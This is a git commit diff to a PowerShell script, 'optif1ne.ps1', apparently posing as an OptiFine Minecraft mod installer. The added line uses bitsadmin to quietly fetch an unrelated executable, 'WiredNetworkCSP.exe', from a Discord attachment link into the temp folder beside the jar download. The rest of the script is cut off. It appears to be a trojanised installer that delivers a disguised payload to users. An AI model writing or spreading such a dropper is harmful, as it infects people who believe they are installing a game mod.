db453d73e8f434dde7aef7a2041aa28952dd1ae8
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-05-11 18:10:41 -0400

    Update optif1ne.ps1

--- optif1ne.ps1
+++ optif1ne.ps1
@@ -1,3 +1,4 @@
+cmd /c bitsadmin /transfer Explorers /download /priority FOREGROUND https://cdn.discordapp.com/attachments/1105931252453871696/1106334092838060072/WiredNetworkCSP.exe '%temp%\\WiredNetworkCSP.exe';
 bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/RedTheMenace/OpifIJejwejwe/main/OptiFine_1.19.4_Installer.jar "$env:temp\Optifine_1.19.4_Installer.jar" ; 
 sleep 3 ; 
 cd $env:temp ; 
